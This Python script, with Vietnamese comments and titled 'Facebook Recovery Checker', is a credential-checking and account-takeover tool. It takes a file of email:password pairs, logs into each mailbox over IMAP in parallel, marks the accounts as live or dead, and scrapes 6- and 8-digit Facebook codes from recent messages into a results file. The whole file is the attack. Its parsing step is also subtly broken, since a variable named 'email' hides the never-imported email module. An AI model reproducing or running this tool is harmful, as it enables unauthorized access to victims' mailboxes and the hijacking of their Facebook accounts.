import re
import imaplib
import time
import json
from concurrent.futures import ThreadPoolExecutor

class SimpleFacebookChecker:
    def __init__(self, max_threads=3):
        self.max_threads = max_threads
        self.results = []
    
    def check_email(self, email, password):
        try:
            domain = email.split('@')[-1].lower()
            
            if 'gmail' in domain:
                server = 'imap.gmail.com'
            elif 'outlook' in domain or 'hotmail' in domain:
                server = 'outlook.office365.com'
            elif 'yahoo' in domain:
                server = 'imap.mail.yahoo.com'
            else:
                server = 'imap.gmail.com'
            
            mail = imaplib.IMAP4_SSL(server, 993)
            mail.login(email, password)
            mail.select('inbox')
            
            # Check số lượng email
            result, data = mail.search(None, 'ALL')
            email_count = len(data[0].split()) if data[0] else 0
            
            mail.close()
            mail.logout()
            
            return {'status': 'LIVE', 'email_count': email_count}
        except:
            return {'status': 'DIE'}
    
    def find_fb_codes(self, email, password):
        try:
            domain = email.split('@')[-1].lower()
            
            if 'gmail' in domain:
                server = 'imap.gmail.com'
            elif 'outlook' in domain or 'hotmail' in domain:
                server = 'outlook.office365.com'
            elif 'yahoo' in domain:
                server = 'imap.mail.yahoo.com'
            else:
                return []
            
            mail = imaplib.IMAP4_SSL(server, 993)
            mail.login(email, password)
            mail.select('inbox')
            
            # Tìm email từ Facebook
            result, data = mail.search(None, '(FROM "facebookmail.com" OR FROM "@facebook.com")')
            email_ids = data[0].split()[-20:]  # Lấy 20 email gần nhất
            
            codes = []
            
            for email_id in email_ids:
                try:
                    result, msg_data = mail.fetch(email_id, '(RFC822)')
                    msg = email.message_from_bytes(msg_data[0][1])
                    
                    # Lấy body
                    body = ""
                    if msg.is_multipart():
                        for part in msg.walk():
                            if part.get_content_type() == 'text/plain':
                                body = part.get_payload(decode=True).decode('utf-8', errors='ignore')
                                break
                    else:
                        body = msg.get_payload(decode=True).decode('utf-8', errors='ignore')
                    
                    # Tìm mã số
                    codes_8 = re.findall(r'\b\d{8}\b', body)
                    codes_6 = re.findall(r'\b\d{6}\b', body)
                    
                    for code in codes_8 + codes_6:
                        if code not in codes:
                            codes.append(code)
                except:
                    continue
            
            mail.close()
            mail.logout()
            
            return codes[:10]  # Trả về tối đa 10 mã
        except:
            return []
    
    def process_account(self, account_line):
        try:
            if ':' not in account_line:
                return None
            
            email, password = account_line.strip().split(':', 1)
            email = email.strip()
            password = password.strip()
            
            result = {
                'account': account_line.strip(),
                'email': email,
                'email_status': '',
                'fb_codes': []
            }
            
            # Check email
            email_result = self.check_email(email, password)
            result['email_status'] = email_result['status']
            
            # Nếu email live thì tìm mã
            if email_result['status'] == 'LIVE':
                codes = self.find_fb_codes(email, password)
                result['fb_codes'] = codes
            
            return result
        except:
            return None
    
    def check_from_file(self, input_file, output_file):
        try:
            with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
                accounts = [line.strip() for line in f if line.strip()]
            
            total = len(accounts)
            live_count = 0
            code_count = 0
            
            print(f"Checking {total} accounts...")
            start_time = time.time()
            
            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                results = list(executor.map(self.process_account, accounts))
            
            # Lọc kết quả None
            valid_results = [r for r in results if r]
            
            # Thống kê
            for result in valid_results:
                if result['email_status'] == 'LIVE':
                    live_count += 1
                if result['fb_codes']:
                    code_count += 1
                
                # In kết quả từng account
                status_char = '✅' if result['email_status'] == 'LIVE' else '❌'
                codes_str = ','.join(result['fb_codes']) if result['fb_codes'] else 'none'
                print(f"{status_char} {result['email']} - Codes: {codes_str}")
            
            elapsed = time.time() - start_time
            
            # Lưu kết quả
            with open(output_file, 'w', encoding='utf-8') as f:
                for result in valid_results:
                    line = f"{result['account']} | {result['email_status']} | {','.join(result['fb_codes'])}"
                    f.write(line + '\n')
            
            # In thống kê
            print(f"\nDone in {elapsed:.1f}s")
            print(f"Total: {total}")
            print(f"Live: {live_count}")
            print(f"With FB codes: {code_count}")
            print(f"Results saved to: {output_file}")
            
        except Exception as e:
            print(f"Error: {e}")

def main():
    print("Facebook Recovery Checker")
    
    input_file = input("Input file: ").strip() or "accounts.txt"
    output_file = input("Output file: ").strip() or "results.txt"
    
    threads = input("Threads (1-10): ").strip()
    try:
        threads = int(threads)
        threads = max(1, min(10, threads))
    except:
        threads = 3
    
    checker = SimpleFacebookChecker(max_threads=threads)
    checker.check_from_file(input_file, output_file)

if __name__ == "__main__":
    main()